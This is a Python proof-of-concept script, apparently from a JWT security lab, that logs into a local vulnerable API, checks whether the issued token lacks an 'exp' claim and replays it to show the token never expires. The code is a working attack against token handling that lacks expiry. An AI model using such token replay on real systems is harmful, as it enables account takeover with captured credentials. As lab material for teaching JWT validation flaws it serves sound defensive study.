#!/usr/bin/env python3
"""
Attack: No Token Expiry / No Temporal Validation
Target: System 5 vulnerable JWT API (http://localhost:5008)
Demonstrates: Access tokens carry no "exp" claim, so a token captured at any
              moment stays valid forever. There is no time bound to outlast.
Reference: RFC 8725 s3.x (claim validation); RFC 7519 s4.1.4 (exp)
"""

import base64
import json
import requests

TARGET = "http://localhost:5008"


def main():
    print("[*] Attack: indefinite token lifetime")
    print("[*] Target:", TARGET)

    r = requests.post(f"{TARGET}/login",
                      json={"username": "alice", "password": "password123"})
    tok = r.json()["access_token"]
    claims = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))

    print("[*] Issued token claims:", list(claims.keys()))
    has_exp = "exp" in claims
    print(f"[*] Token contains an 'exp' (expiry) claim: {has_exp}")

    # The "theft + later replay" simulation: in a real incident the attacker
    # captures this token (XSS, log leak, proxy) and uses it whenever they like.
    # We replay it immediately to prove acceptance; with no exp, the same call
    # succeeds identically a year from now.
    resp = requests.get(f"{TARGET}/api/profile",
                        headers={"Authorization": f"Bearer {tok}"})
    print(f"[*] Replay of captured token -> HTTP {resp.status_code}")

    if not has_exp and resp.status_code == 200:
        print("[+] Attack succeeded. Attacker gained: a credential with NO")
        print("    expiry. There is no natural moment at which this token stops")
        print("    working - rotation and revocation are the ONLY ways to kill it,")
        print("    and this server has neither.")


if __name__ == "__main__":
    main()
